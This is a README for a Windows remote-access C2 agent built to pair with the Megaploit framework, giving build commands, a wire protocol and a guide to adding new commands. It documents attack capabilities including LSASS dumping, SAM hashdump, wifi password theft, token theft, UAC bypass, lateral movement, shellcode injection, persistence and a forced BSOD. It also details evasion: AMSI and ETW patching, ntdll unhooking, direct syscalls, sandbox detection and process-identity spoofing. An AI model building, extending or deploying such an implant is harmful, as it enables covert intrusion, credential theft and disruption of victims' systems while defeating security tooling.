# C-remote-shell — Megaploit C Agent

A Windows-native C2 agent for the [Megaploit](https://github.com/hagba/Megaploit) framework.
Fully encrypted, authenticated, and evasion-hardened — designed to pair with
`python server.py -lh <IP> -p <PORT> --tls`.

---

## Table of Contents

1. [Quick Start](#quick-start)
2. [Commands Reference](#commands-reference)
3. [Evasion & Stealth](#evasion--stealth)
4. [Security Architecture](#security-architecture)
5. [Building the Agent](#building-the-agent)
6. [Debug Builds](#debug-builds)
7. [Project Layout](#project-layout)
8. [Configuration Reference](#configuration-reference)
9. [Protocol Wire Format](#protocol-wire-format)
10. [Adding a New Command](#adding-a-new-command)

---

## Quick Start

### 1. Generate a key and start the Megaploit listener

```bash
# from the Megaploit repo root
python -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
# copy the same secret.key to C-remote-shell/secret.key before building
python server.py -lh 192.168.1.10 -p 4444 --tls
```

> **Both sides must use the same `secret.key`.** The server reads from the repo
> root; the agent reads from the directory next to its EXE.  If they differ the
> HMAC challenge/response fails and the server closes the socket immediately.

### 2. Build the agent

**Recommended — key embedded in binary (no file on target):**

```bash
# MSYS2 UCRT64 terminal
cd C-remote-shell
# Generate a key and get the exact make command:
python tools/gen_key.py
# Copy the printed hex into secret.key on the server, then build:
mingw32-make C2_IP=10.0.0.1 C2_PORT=4444 SECRET_KEY=<64-char-hex>
```

> **`C2_IP` is required** — there is no default. Omitting it is a hard compile
> error to prevent shipping a binary with a stale lab IP.

The key is XOR-obfuscated against a compile-time mask in `.data` — a plain
`strings` scan will not reveal it.

**Alternative — file-based key (original behaviour):**

```bash
mingw32-make C2_IP=10.0.0.1 C2_PORT=4444
```

Place `secret.key` (64 hex chars) next to the EXE at runtime.

### 3. Catch the session

Run `megaploit_c_agent.exe` on the target. The agent checks the environment for
sandboxes, sleeps 15–25 s to exhaust automated analysis budgets, auto-migrates
to a live `svchost.exe` process (or `%TEMP%\RuntimeBroker.exe` as fallback),
connects back, completes the TLS + HMAC handshake, and a session appears in
the Megaploit console.

---

## Commands Reference

### Native C handlers (direct Windows API — no child process)

| Verb | Args | Description |
|---|---|---|
| `sysinfo` | — | OS version, hostname, username, arch, CWD |
| `os_info` | — | Build number, install date, uptime |
| `cd` | `<path>` | `SetCurrentDirectoryA` |
| `ls` | `[path]` | Directory listing with size and date |
| `ps` | — | Running processes: PID, PPID, name, arch, owner |
| `kill` | `<pid>` | `TerminateProcess` |
| `env` | `[filter]` | Dump environment variables (optional substring filter) |
| `getclip` | — | Read clipboard text |
| `setclip` | `<text>` | Write clipboard text |
| `idle_time` | — | Seconds since last user input (`GetLastInputInfo`) |
| `lock_screen` | — | `LockWorkStation` |
| `active_windows` | — | Titles of all visible top-level windows |
| `msgbox` | `<title> <message>` | Pop a dialog via `mshta.exe` (detached) |
| `upload` | `<filename>` | Receive a file from C2 and write to disk |
| `download` | `<path>` | Read a file from disk and send to C2 |
| `persist` | `<regkey> <filename>` | Copy EXE to `%APPDATA%\<filename>`, set HKCU Run key |
| `self_destruct` | — | Remove run key, `MoveFileExA` deferred delete, exit |
| `run_psh` | `<cmd>` | Execute a PowerShell one-liner via anonymous pipe |
| `open_url` | `<url>` | Open URL in default browser (`ShellExecuteA`) |
| `set_wallpaper` | `<path>` | Set desktop wallpaper (`SPI_SETDESKWALLPAPER`) |
| `mouse_move` | `<x> <y>` | Move cursor to absolute screen coordinates |
| `type_keys` | `<text>` | Simulate keyboard input (`SendInput KEYEVENTF_UNICODE`) |
| `clip_watch` | — | Poll clipboard for 30 s; return first change detected |

### Lateral movement, credential access & privilege escalation

| Verb | Args | Description |
|---|---|---|
| `dump_lsass` | — | `NtCreateSection`/`NtMapViewOfSection` snapshot → `MiniDumpWriteDump` fallback → `%TEMP%\lsass.dmp` |
| `token_impersonate` | `<pid>` | Steal + impersonate the primary token from a process |
| `token_revert` | — | `RevertToSelf()` — drop back to the process token |
| `getsystem` | — | Named-pipe token impersonation → SYSTEM token |
| `uac_bypass` | `<cmd>` | CMSTPLUA COM auto-elevation — run `<cmd>` at high IL, no UAC prompt |
| `lateral_wmi` | `<host> <cmd>` | Remote exec via `wmic Win32_Process.Create` |
| `lateral_sc` | `<host> <cmd>` | Remote exec via `sc create/start/delete` (runs as SYSTEM) |

### Injection & migration

| Verb | Args | Description |
|---|---|---|
| `inject` | `<pid> <hex>` | Inject raw shellcode (hex string) into a process via NT syscalls |
| `migrate` | `<pid>` | Reflective PE injection into `<pid>`, then `ExitProcess(0)` |

### Background jobs

| Verb | Args | Description |
|---|---|---|
| `bg` | `<cmd>` | Run a shell command in the background — returns a job ID immediately |
| `jobs` | — | List all background jobs (ID, state, bytes buffered) |
| `job_output` | `<id>` | Fetch and print the output of a completed job |
| `job_kill` | `<id>` | Terminate a running background job |

### In-process evasion

| Verb | Description |
|---|---|
| `etw_patch` | Patch `EtwEventWrite` → `ret` in the current process |

### Power / destructive

| Verb | Description |
|---|---|
| `forceOff()` | `NtSetSystemPowerState` + `NtShutdownSystem` |
| `blueScreen()` | `NtRaiseHardError(STATUS_ASSERTION_FAILURE)` — kernel BSOD |

### Shell-command fallbacks (`cmd.exe`)

| Verb | Shell command run |
|---|---|
| `users` | `net user` |
| `logged_in` | `query user` |
| `services [filter]` | `sc query state= all` |
| `scheduled_tasks` | `schtasks /query /fo LIST` |
| `installed_software` | `reg query HKLM\...\Uninstall /s /v DisplayName` |
| `startup_items` | `reg query HKCU\...\Run` + `HKLM\...\Run` |
| `wifi_passwords` | `netsh wlan show profile name=... key=clear` |
| `hashdump` | `reg save HKLM\SAM/SYSTEM → %TEMP%` |
| `netstat` | `netstat -ano` |
| `arp` | `arp -a` |
| `ifconfig` | `ipconfig /all` |
| `routes` | `route print` |
| `dns_query <host>` | `nslookup "<host>"` |
| `cat <file>` | `type "<file>"` |
| `mkdir <path>` | `mkdir "<path>"` |
| `rm <path>` | `del /f /q` or `rmdir /s /q` |
| `find_files <path> [pat]` | `dir /s /b "<path>\<pat>"` |
| `file_hash <path>` | `certutil -hashfile "<path>" SHA256` |
| `<anything else>` | Passed verbatim to `_popen("cmd /c ...")` |

---

## Evasion & Stealth

The agent applies eight independent layers at startup, before the C2 connection
is attempted. All layers are compiled into the binary.

### 1. Application manifest

An embedded `RT_MANIFEST` resource declares supported OS GUIDs (Vista through
Windows 11) and `requestedExecutionLevel asInvoker`. Makes the binary look like
a legitimately signed application to AV heuristic engines that flag manifest-less
executables.

### 2. Process-identity spoofing (`client/evasion/spoof_obf.c`)

| Technique | Effect |
|---|---|
| PEB field overwrite (`RTL_USER_PROCESS_PARAMETERS`) | Task Manager command-line column shows `svchost.exe -k netsvcs -p -s Schedule` |
| Kernel image name (`NtSetInformationProcess` class 49 + 74) | Process Hacker "Image" column shows `svchost.exe` |
| LDR unlink (`PEB→Ldr` list + `LdrpHashTable` bucket) | Hides the module from in-process module scanners; version-aware: skips `InInitializationOrderLinks` on Windows 8+ |

### 3. EDR evasion (`client/evasion/evasion_obf.c`)

| Function | What it does |
|---|---|
| `unhook_ntdll()` | Remaps `ntdll.dll` `.text` section fresh from disk, overwriting any EDR inline hooks. Called **first** so subsequent NT syscall resolutions see clean stubs. |
| `etw_patch()` | Overwrites `EtwEventWrite` prologue with a `ret` stub — stops Windows Event Tracing telemetry from this process. |
| `amsi_patch()` | Patches `AmsiScanBuffer` in `amsi.dll` to return `AMSI_RESULT_CLEAN` — prevents PowerShell/WSH/.NET AMSI scanning. |

### 4. Sandbox detection + startup delay (`client/evasion/sandbox.c`)

Five independent checks run before the C2 connect loop:

| Check | Method |
|---|---|
| Hypervisor present | `CPUID` leaf 1, ECX bit 31 |
| RDTSC timing anomaly | Two serialised `RDTSC` reads; delta > 1 000 000 cycles → VM exit overhead |
| Physical RAM < 4 GB | `GlobalMemoryStatusEx` |
| CPU count < 2 | `GetNativeSystemInfo` |
| Known sandbox DLLs loaded | PEB LDR walk; hashes of `SbieDll`, `cuckoomon`, `cmdvrt64`, etc. |

If the environment looks like a sandbox the agent **exits silently**.
On a clean pass `sandbox_delay()` sleeps **15–25 seconds** via a direct
`NtDelayExecution` syscall — exhausting automated sandbox time budgets without
importing `Sleep`.

### 5. IAT-free API resolution (`client/evasion/peb_walk.c`)

`GetModuleHandleA`, `GetProcAddress`, and `LoadLibraryA` do not appear in the
import table. The agent resolves all exports via direct PEB walks.

| Function | What it does |
|---|---|
| `peb_get_module(hash)` | Walks `PEB→Ldr→InMemoryOrderModuleList`, returns the base of the module whose lowercase name matches a seeded djb2-xorshift hash |
| `peb_get_export(base, hash)` | Walks the PE export directory with a full linear hash scan — correct on all Windows builds, no static constants in `.data` |
| `peb_hash_str(s)` / `peb_hash_wstr(w)` | Runtime seeded djb2-xorshift hash — seed set from `RDTSC` once per run; hash values differ between executions and cannot be pre-computed by static scanners |

> **Note:** The export walk uses a full linear scan over `AddressOfNames`
> comparing DWORD hashes (no `strcmp`). The seeded hash means no static
> constant appears in `.rdata` for a YARA rule to match, and no
> `GetProcAddress` IAT entry exists.

### 6. Direct syscalls — Hell's Gate / Halo's Gate / Tartarus' Gate (`client/evasion/syscall_obf.c`)

Bypasses ntdll entirely so EDR hooks on Win32 API wrappers are irrelevant:

| Gate | Condition | Strategy |
|---|---|---|
| **Hell's Gate** | Clean stub (`mov r10,rcx` / `mov eax,SSN`) | Read SSN at offset `+4` |
| **Tartarus' Gate** | `int 0x2e` fallback stub | Same SSN read; gadget becomes `CD 2E C3` |
| **Halo's Gate** | Stub hooked with `E9` JMP | Scan ±N neighbouring stubs; `SSN[target] = SSN[neighbour] ± delta` |

Stride between stubs is measured at runtime. Each SSN gets its own gadget
pointer (`syscall;ret` vs `int 0x2e;ret`). Trampolines jump into ntdll so the
kernel trap-frame RIP always points inside ntdll — defeating EDR heuristics
that flag syscalls originating outside ntdll.

All NT function name strings are XOR-encoded blobs decoded on the stack at
runtime — no plaintext strings appear in `.rdata`.

### 7. Auto-migration (`client/inject/inject.c`)

On startup, before the connect loop:

**Tier 1 — Reflective in-memory injection (no disk artifact):**
1. Finds a live 64-bit `svchost.exe` that can be opened with injection rights
2. Injects itself via the reflective PE loader blob (`client/inject/loader.c`)
3. Calls `AgentRun()` in the host process, then `ExitProcess(0)`

**Tier 2 — `%TEMP%` copy fallback (if Tier 1 fails):**
1. Copies itself to `%TEMP%\RuntimeBroker.exe`
2. Spawns it as `CREATE_SUSPENDED`, resumes, then `ExitProcess(0)`

### 8. Injection hardening

- All NT calls go through direct-syscall trampolines — no `VirtualAllocEx` or
  `CreateRemoteThread` in the import table
- Two-phase memory permissions: **RW** → **RX** — no RWX pages ever
- `NtCreateThreadEx` called with `HideFromDebugger` flag
- Reconnect delay jittered ±30% to break fixed-interval beacon detection

---

## Security Architecture

Four layers wrap every byte in transit:

```
TLS 1.2/1.3 (SChannel, AEAD-only)
  └─ HMAC-SHA256 challenge/response  (secret.key, 32 raw bytes)
       └─ Protocol v2 magic-byte echo  (0x4d)
            └─ AES-256-GCM framed messages
                 [uint32-BE length][nonce(12)][ciphertext][GCM-tag(16)]
                 + uint64-BE sequence counter (replay protection)
```

**Layer 1 — TLS**
`SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`, `SCH_USE_STRONG_CRYPTO`
(AEAD-only cipher suites), `ISC_REQ_NO_RENEGOTIATION`.

**Layer 2 — HMAC authentication**
Server sends a 16-byte random challenge. Agent replies with
`HMAC-SHA256(secret_key[32], challenge[16])`. Server drops on mismatch.

**Layer 3 — Protocol handshake**
Server sends `0x4d` (`M`). Agent echoes it back. Version gate.

**Layer 4 — AES-256-GCM framing**
Every message encrypted with a fresh 12-byte nonce. A big-endian 64-bit
sequence number prepended to the plaintext enforces strict replay protection.

---

## Building the Agent

### Requirements

- **Windows host** with [MSYS2 UCRT64](https://www.msys2.org/) (`C:\msys64\ucrt64\bin` in PATH), **or**
- **Linux / macOS** with `x86_64-w64-mingw32-gcc` (`apt install mingw-w64`)
- **Python 3** (for `tools/gen_key.py` only)

### Option A — MinGW / MSYS2 UCRT64 (recommended)

```bash
# Embedded key (no secret.key file on target):
mingw32-make C2_IP=10.0.0.1 C2_PORT=4444 SECRET_KEY=<64-hex-chars>

# File-based key:
mingw32-make C2_IP=10.0.0.1 C2_PORT=4444
```

### Option B — MinGW cross-compile (Linux / macOS)

```bash
make CC=x86_64-w64-mingw32-gcc C2_IP=10.0.0.1 C2_PORT=4444
```

### Option C — MSVC (Developer Command Prompt)

```cmd
nmake C2_IP=10.0.0.1 C2_PORT=4444
```

### Build flags

| Flag | Purpose |
|---|---|
| `C2_IP=` | **(required)** C2 listener IP |
| `C2_PORT=` | TCP port (default `50005`) |
| `SECRET_KEY=` | Embed 64-hex-char key in binary (no `secret.key` on target) |
| `MUTEX_NAME=` | Override single-instance mutex name |
| `MIGRATE_NAME=` | Override auto-migrate destination filename |
| `DBG=1` | Debug build — see [Debug Builds](#debug-builds) |
| `-DDISABLE_AUTO_MIGRATE` | Skip migration (testing only) |
| `-DDISABLE_EVASION` | Skip `unhook_ntdll`, `etw_patch`, `amsi_patch` (testing only) |
| `-DDISABLE_SANDBOX_CHECK` | Skip sandbox detection and delay (testing only) |

---

## Debug Builds

The agent includes a structured runtime debugger that is **completely compiled
out in release builds** — zero overhead, zero extra strings, zero extra imports.

### Enable

```bash
mingw32-make C2_IP=127.0.0.1 C2_PORT=4444 DBG=1
```

`DBG=1` automatically sets:
- `-DAGENT_DEBUG` — activates all `dbg_*()` calls
- `-DDISABLE_AUTO_MIGRATE` — keeps the agent in the original process
- `-DDISABLE_SANDBOX_CHECK` — skips sandbox delay for instant startup
- `-DDISABLE_EVASION` — skips ntdll/ETW/AMSI patches

### Output

Every event goes to **two destinations simultaneously**:

1. **`C:\Windows\Temp\megaploit_agent_debug.log`** — timestamped, appended across runs
2. **`OutputDebugStringA`** — prefix `[MAGENT]` — live in x64dbg / WinDbg / Sysinternals DbgView

### Log format

```
[HH:MM:SS.mmm | SUBSYS | SEV ] message
```

### Subsystems logged

| Tag | Covers |
|---|---|
| `INIT  ` | Process identity (PID, image path, user, integrity, OS build) |
| `NTCALL` | `ntcalls_load()` / `ntcalls_verify()` — per-pointer address + per-bit result decode |
| `SCALL ` | `sc_init()` — all 11 SSNs and gadget addresses after Hell's/Halo's Gate |
| `INJECT` | `inject_init()` return value |
| `SPOOF ` | `spoof_peb()`, `spoof_kernel_image()`, `unlink_self_from_ldr()` |
| `MIGRAT` | `auto_migrate()` target PID, path, result |
| `SNDBOX` | `sandbox_check()` — per-check detail (CPUID, RDTSC delta, RAM, CPUs) |
| `EVASN ` | `unhook_ntdll()`, `etw_patch()`, `amsi_patch()` before/after |
| `KEY   ` | `load_secret_key()` path, decode result |
| `NET   ` | `WSAStartup`, `socket()`, `InetPtonA`, `connect()` retries with `WSAGetLastError()` |
| `SOCK  ` | `setsockopt()` return values for `SO_RCVTIMEO` and `SO_KEEPALIVE` |
| `TLS   ` | `tls_connect()` result + `lastErr` code with human-readable decode |
| `SHELL ` | `shell_run()` session start and end |
| `THREAD` | `_agent_thread` lifecycle (post-migration path) |

### Return value reference

**`ntcalls_load()`**

| Value | Meaning |
|---|---|
| `0xFF` | All four exports resolved — OK |
| `0x00` | `ntdll.dll` not found in PEB |
| `0x01` | `RtlAdjustPrivilege` missing |
| `0x02` | `NtShutdownSystem` missing |
| `0x04` | `NtSetSystemPowerState` missing |
| `0x08` | `NtRaiseHardError` missing |
| Multiple | OR'd together; `0x0F` = all four missing |

**`ntcalls_verify()`**

| Value | Meaning |
|---|---|
| `0x00` | All OK — pointers valid, `SeShutdownPrivilege` acquired |
| `0x01–0x08` | Same bit map as above — pointer is NULL |
| `0x10` | `RtlAdjustPrivilege()` returned non-STATUS_SUCCESS (privilege denied) |

---

## Project Layout

```
C-remote-shell/
│
├── Makefile                        Auto-detect MSVC/MinGW; targets: client, legacy, server, clean
│
├── client/
│   │
│   ├── core/                       Entry point and shared NT infrastructure
│   │   ├── config.h                C2 IP/port, key path, buffer sizes
│   │   ├── main.c                  WinMain + AgentRun + _agent_thread — fully instrumented
│   │   ├── ntcalls.h / ntcalls.c   NT function pointer load/verify with bitmask return codes
│   │   └── (megaploit_build_config.h)  Auto-generated by _make_config.py; not committed
│   │
│   ├── debug/                      Runtime debugger (compiled only with DBG=1)
│   │   ├── agent_debug.h           Public API + no-op stubs (zero overhead in release)
│   │   └── agent_debug.c           Log file + OutputDebugStringA implementation
│   │
│   ├── evasion/                    All stealth and hook-bypass code
│   │   ├── spoof.h / spoof.c           PEB + kernel image name spoofing; LDR unlinking
│   │   ├── spoof_obf.c                 Obfuscated build of spoof.c (compiled into binary)
│   │   ├── evasion.h / evasion.c       unhook_ntdll, etw_patch, amsi_patch
│   │   ├── evasion_obf.c               Obfuscated build of evasion.c (compiled into binary)
│   │   ├── peb_walk.h / peb_walk.c     PEB module/export resolution; seeded djb2-xorshift hash
│   │   ├── syscall.h / syscall.c       Hell's/Halo's/Tartarus' Gate direct syscall stubs
│   │   ├── syscall_obf.c               Obfuscated build of syscall.c (compiled into binary)
│   │   ├── sandbox.h / sandbox.c       Sandbox/VM detection (CPUID, RDTSC, RAM, CPU, LDR scan)
│   │   ├── obf.h                       OBF_S / OBF_W stack-decode macros
│   │   └── gen_obf.py                  Regenerates *_obf.c from source files
│   │
│   ├── inject/                     Process injection, reflective PE loading, auto-migration
│   │   ├── inject.h / inject.c     inject_shellcode, migrate_to_pid, auto_migrate,
│   │   │                           obfuscate_sleep, jitter_sleep
│   │   ├── loader.h / loader.c     Position-independent reflective PE loader (< 512 B blob)
│   │   ├── loader_blob.h           Auto-generated: loader stub as a C byte array
│   │   ├── agent.rc                VERSIONINFO + RT_MANIFEST resource script
│   │   ├── agent.manifest          Application manifest (embedded as RT_MANIFEST)
│   │   └── agent.res               Compiled resource object (windres output; committed)
│   │
│   └── shell/                      Command dispatch and all C2 verb handlers
│       ├── shell.h                 Public API: shell_run(TLS_CONTEXT *)
│       ├── shell.c                 Dispatch loop, _json_unwrap, _send_str, _shell_exec
│       ├── shell_internal.h        Shared internal API (handler forward declarations)
│       ├── handlers_system.c       sysinfo, os_info, cd, ls, ps, kill, env,
│       │                           idle_time, lock_screen, active_windows
│       ├── handlers_ui.c           getclip, setclip, msgbox, upload, download,
│       │                           persist, self_destruct, run_psh, open_url,
│       │                           set_wallpaper, mouse_move, type_keys, clip_watch
│       └── handlers_lateral.c      dump_lsass, token_impersonate, token_revert,
│                                   getsystem, uac_bypass, lateral_wmi, lateral_sc
│
├── tls/
│   ├── tls_client.h                TLS_CONTEXT struct, public API declarations
│   └── tls_client.c                TLS + HMAC + AES-GCM implementation (SChannel + BCrypt)
│
├── server/                         Refactored POSIX C2 listener (Linux / macOS)
│   ├── main.c / server.c / prompt.c
│   └── config.h
│
├── tools/
│   ├── gen_key.py                  Generate a random 32-byte key + make invocation
│   └── gen_loader_blob.py          Compile loader.c → extract blob → write loader_blob.h
│
├── Source.c                        Legacy monolithic client (kept for `make legacy`)
├── definitions.h                   Shared globals for Source.c
└── serverShell.c                   Legacy POSIX server (kept for `make server-posix-legacy`)
```

---

## Configuration Reference

All compile-time knobs live in [`client/core/config.h`](client/core/config.h).

| Constant | Default | Description |
|---|---|---|
| `C2_IP` | *(required)* | C2 listener address |
| `C2_PORT` | `50005` | C2 listener port |
| `RECONNECT_DELAY_SEC` | `10` | Seconds between failed connection retries |
| `RECONNECT_JITTER_PCT` | `30` | ±% random jitter on reconnect delay |
| `SECRET_KEY_PATH` | `"secret.key"` | Relative filename of the HMAC key file (Mode B only) |
| `SECRET_KEY_LEN` | `32` | Decoded key length in bytes (file holds 64 hex chars) |
| `SHELL_LINE_BUF` | `4096` | `fgets()` line buffer for `_popen` output |
| `SHELL_RESP_BUF` | `65536` | Initial accumulated response buffer |
| `INJECT_MAX_SHELLCODE` | `32768` | Maximum shellcode bytes accepted by `inject` verb |
| `PS_MAX_PROCS` | `512` | Maximum processes listed by `ps` before truncation |
| `DOWNLOAD_MAX_BYTES` | `67108864` | Maximum file size for `download` (64 MB) |

**Secret key format:** Exactly 64 ASCII hex characters. Generate with:

```python
python -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

The same hex must be loaded by the Megaploit server (`megaploit/core/crypto.py`).
Both copies must match — if they differ the HMAC auth fails silently and the
server closes the socket immediately after TCP connect.

---

## Protocol Wire Format

### Layer 4 — AES-256-GCM frame

```
[uint32-BE  total_len  ]   4 bytes
[byte[12]   nonce      ]  12 bytes  — random, fresh per message
[byte[N]    ciphertext ]   N bytes  — AES-256-GCM(seq_be64 ++ plaintext)
[byte[16]   GCM tag    ]  16 bytes
```

Sequence number prepended to plaintext before encryption as big-endian uint64.
Receiver enforces `seq > last_seq` (strict monotonicity = replay protection).

### Layer 3 — Protocol v2 handshake

```
Server → 0x4d  ('M')
Client → 0x4d  (echo)
```

### Layer 2 — HMAC-SHA256 authentication

```
Server → 16 random bytes  (challenge)
Client → HMAC-SHA256(secret_key[32], challenge[16])  = 32 bytes
```

Server drops connection on mismatch.

### Layer 1 — TLS 1.2 / 1.3

SChannel with `SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT`,
`SCH_USE_STRONG_CRYPTO`, `ISC_REQ_NO_RENEGOTIATION`.

---

## Adding a New Command

1. **Pick the right handler file:**
   - System/recon verb → `client/shell/handlers_system.c`
   - UI/file/persistence verb → `client/shell/handlers_ui.c`
   - Lateral/credential/privilege verb → `client/shell/handlers_lateral.c`
   - Trivial one-liner → inline in `client/shell/shell.c`

2. **Write the handler:**

```c
void _handle_myverb(TLS_CONTEXT *pTls, const char *args)
{
    // ... do work ...
    _send_str(pTls, "[+] result");
}
```

3. **Declare it in `client/shell/shell_internal.h`:**

```c
void _handle_myverb(TLS_CONTEXT *pTls, const char *args);
```

4. **Add a dispatch branch in `client/shell/shell.c`** inside `shell_run()`:

```c
if (cbCmd >= 8 && strncmp("myverb ", cmd, 7) == 0) {
    char args[256] = {0};
    strncpy(args, cmd + 7, sizeof(args) - 1);
    free(pCmd); pCmd = NULL;
    _handle_myverb(pTls, args);
    continue;
}
```

5. **Build and test:**

```bash
mingw32-make C2_IP=127.0.0.1 C2_PORT=4444 DBG=1
```

No other files need to change. The Megaploit C2 probe (`megaploit/core/c_probe.py`)
discovers new verbs automatically by scanning the `strncmp()` calls in the compiled
binary at runtime.
